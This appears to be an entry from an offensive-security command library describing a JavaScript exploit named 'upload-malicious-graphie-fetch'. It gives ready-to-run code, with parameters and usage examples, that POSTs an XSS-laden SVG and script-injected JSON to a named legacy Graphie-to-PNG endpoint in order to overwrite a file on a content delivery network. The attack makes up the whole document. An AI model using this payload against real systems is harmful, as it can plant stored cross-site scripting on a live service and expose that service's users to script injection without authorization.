---
id: cmd-upload-graphie-001
name: upload-malicious-graphie-fetch
type: command
executor: javascript
data: >-
  var form = new FormData(); form.append("js",ORIGINAL_JS);
  form.append("svg",XSS_SVG);
  form.append("other_data",JSON.stringify(XSS_JSON)); await
  fetch("http://graphie-to-png.kasandbox.org/svg",{"method":"POST","body":
  form}).then(r=>r.text())
output: Text response from the server after successful upload
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.269Z'
platforms:
  - Web
tags:
  - xss
  - upload
verified: false
validated: true
submitted: true
---

# upload-malicious-graphie-fetch

## Command

```javascript
var form = new FormData(); form.append("js",ORIGINAL_JS); form.append("svg",XSS_SVG); form.append("other_data",JSON.stringify(XSS_JSON)); await fetch("http://graphie-to-png.kasandbox.org/svg",{"method":"POST","body": form}).then(r=>r.text())
```

## Description

This JavaScript command creates a FormData object with Graphie components and POSTs to the legacy API to upload and override a malicious file on the CDN/S3.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ORIGINAL_JS | Original JavaScript code for the Graphie | Yes |
| XSS_SVG | Malicious SVG content with onload payload | Yes |
| XSS_JSON | Malicious JSON object with script injection | Yes |
| url | API endpoint (e.g., http://graphie-to-png.kasandbox.org/svg) | Yes |
| method | HTTP method (POST) | Yes |
| body | FormData object | Yes |

## Examples

### Basic Usage

```javascript
var form = new FormData(); form.append("js","var graph = new Graphie();"); form.append("svg","<svg onload=\"alert('XSS')\"></svg>"); form.append("other_data",JSON.stringify({labels:[{text:"<script>alert('XSS')</script>",typesetAsMath:false}]})); await fetch("http://graphie-to-png.kasandbox.org/svg",{"method":"POST","body": form}).then(r=>r.text())
```

### Advanced Usage

```javascript
// With error handling
const response = await fetch("http://graphie-to-png.khanacademy.systems/svg", {method: "POST", body: form}).then(r => { if (r.ok) return r.text(); else throw new Error('Upload failed'); });
console.log(response);
```

## Expected Output

A plain text response from the server, typically indicating successful processing (e.g., empty string or status message) if the upload overrides the file by hash.

## Related

- [[procedures/Upload-Malicious-Graphie-via-Legacy-API]]
